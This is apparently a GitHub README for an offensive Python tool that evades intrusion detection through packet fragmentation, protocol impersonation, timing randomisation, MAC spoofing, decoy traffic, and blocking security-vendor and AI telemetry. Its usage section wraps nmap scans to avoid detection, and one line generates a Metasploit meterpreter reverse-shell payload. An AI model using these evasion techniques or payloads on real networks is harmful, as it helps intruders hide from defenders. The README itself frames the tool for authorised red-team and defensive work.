# Flea Flicker NetFilter

IDS blocks your scans. ML detects your payloads. Behavioral analysis flags your timing.

**Flea Flicker manipulates network traffic before detection systems see it.**

Python-based network filter with packet manipulation, MAC spoofing, and IDS evasion capabilities.

---

## What It Does

**Packet manipulation:** Fragment payloads. Randomize timing. Impersonate protocols.

**MAC spoofing:** Rotate addresses. Spoof vendor OUIs. Bypass MAC filtering.

**Traffic mimicry:** Generate legitimate-looking background traffic. Hide attacks in noise.

**AI evasion:** Block OpenAI, Copilot, security vendors. Stop data collection during pentests.

---

## Installation

```bash
git clone https://github.com/ghostintheprompt/flea-flicker-netfilter
cd flea-flicker-netfilter
chmod +x install.sh
sudo ./install.sh
```

**Requirements:**
- Linux (Kali, ParrotOS, Ubuntu, Debian)
- Python 3.8+
- Root access
- Dependencies: psutil, scapy

---

## Quick Start

**Ghost Mode (ultimate stealth):**
```bash
./launch.sh ghost
```

**Shadow Mode (red team + Tor):**
```bash
./launch.sh shadow
```

**AI Evasion Only:**
```bash
./launch.sh ai-evasion
```

**Experimental Chaos Mode:**
```bash
./launch.sh chaos  # Maximum experimental evasion
```

---

## Operation Modes

| Mode | Command | Purpose |
|------|---------|---------|
| **Ghost** | `./launch.sh ghost` | Ultimate stealth - blocks all AI/telemetry |
| **Shadow** | `./launch.sh shadow` | Red team + AI evasion + Tor |
| **Phantom** | `./launch.sh phantom` | Maximum stealth + traffic mimicry |
| **AI Evasion** | `./launch.sh ai-evasion` | Block AI services only |
| **Basic** | `./launch.sh basic` | Standard filtering |

**Experimental Modes:**
| Mode | Command | Risk |
|------|---------|------|
| **Trick Play** | `./launch.sh trick-play` | MAC spoofing + AI confusion | Low |
| **Misdirection** | `./launch.sh misdirection` | MAC rotation + honeypots | Medium |
| **Deception** | `./launch.sh deception` | Full deception suite | High |
| **Chaos** | `./launch.sh chaos` | Maximum chaos | Extreme |

---

## Features

### DPI Evasion
Fragment payloads across multiple packets. IDS sees incomplete fragments, allows them. Target reassembles into full attack.

### Protocol Impersonation
Make Nmap scans look like HTTPS traffic. Hide SMB enumeration in DNS queries. IDS sees legitimate protocols.

### Timing Randomization
Random delays between packets (0.1s - 5s). Mimics human interaction. Defeats time-series analysis.

### MAC Spoofing
Rotate MAC every N packets. Spoof vendor OUIs (Cisco, Dell, Intel). Bypass MAC filtering.

### Traffic Mimicry
Generate decoy traffic. Match office worker patterns. Mix HTTP, DNS, SMTP. Real attack hidden in noise.

### AI Detection Evasion
Blocks connections to:
- AI services (OpenAI, Copilot, Google AI, Claude)
- Security vendors (CrowdStrike, SentinelOne, Symantec)
- Analytics (Google Analytics, Microsoft telemetry)
- Threat intel (VirusTotal, Hybrid Analysis)

---

## Basic Usage

**Wrap any command:**
```bash
# Evade IDS during Nmap scan
./launch.sh ghost nmap -A target.com

# MAC rotation on interface
./launch.sh shadow --interface wlan0

# Protocol impersonation
./launch.sh phantom --protocol https nmap -p 445 target.com
```

**Custom configuration:**
```bash
./launch.sh custom \
  --fragment-size 64 \
  --delay 0.5-3.0 \
  --protocol https \
  --mac-rotation 100
```

---

## Integration

**Metasploit:**
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw > payload.bin

# Run with Flea Flicker
./launch.sh ghost msfconsole
```

**Nmap:**
```bash
# Standard scan (gets detected)
nmap -A target.com

# With Flea Flicker (evades detection)
./launch.sh phantom nmap -A target.com
```

**Burp Suite:**
```bash
./launch.sh shadow burpsuite
```

---

## VMware Setup (macOS Users)

```bash
# In VMware Fusion: Share this directory with Kali VM
# In Kali VM:
cd /mnt/hgfs/flea_flicker_netfilter
chmod +x vmware_setup.sh
./vmware_setup.sh

# Launch
./launch.sh ghost
```

---

## When To Use This

**Authorized pentests.** Client network has IDS/IPS. You need stealth. Written permission in hand.

**Red team exercises.** Blue team thinks they're safe. Prove them wrong.

**Security research.** Testing detection algorithms. Building better defenses.

**Defense development.** Blue team training. Understand attacker techniques.

---

## Don't Be Stupid

**Unauthorized networks = federal prison.** CFAA violation. Real consequences.

**No written authorization = don't use this tool.** Period.

Critical infrastructure, employer networks, school networks without permission = extra illegal.

**For red teams testing defenses. Not criminals.**

You need: Written authorization. Defined scope. Professional pentest engagement or research environment.

Don't learn CFAA definitions in federal court.

---

## Why This Exists

Built after pentest where client deployed ML-based IDS. Standard tools = instant detection. Needed network manipulation before IDS analysis.

Python-based implementation using Scapy for packet manipulation. MAC spoofing at interface level. Traffic generation for mimicry.

**Works against:** Commercial IDS/IPS, behavioral analysis, signature detection, timing correlation.

**Doesn't work against:** Deep SSL inspection with client certs, nation-state detection, air-gapped networks.

**The technique:** Understand detection methods. Evade systematically. DPI reads content = fragment it. Timing analysis looks for patterns = randomize them. Protocol detection flags unusual traffic = impersonate legitimate services.

---

## For Red Teams

Python-based tool. Not kernel-level netfilter (that requires C modules). Provides packet manipulation via Scapy, MAC spoofing via ip link, traffic generation via requests.

Test in lab first. Understand limitations. Don't rely on automation.

---

## For Blue Teams

Attackers use these techniques. Update signatures. Behavioral analysis alone isn't enough.

Multi-layer detection: content + timing + volume + protocol analysis.

If open-source tools evade your IDS, real attackers already are.

---

## Documentation

- **STEALTH_GUIDE.md** - Advanced stealth features
- **QUICKSTART.md** - Installation and setup
- **VM_DEPLOYMENT.md** - VMware workflow
- **FLEA_FLICKER_GUIDE.md** - Experimental features

---

**[github.com/ghostintheprompt/flea-flicker-netfilter](https://github.com/ghostintheprompt/flea-flicker-netfilter)**

Python network manipulation. IDS evasion. Red team toolkit.

Authorized pentests only. Written permission required. Don't be stupid.
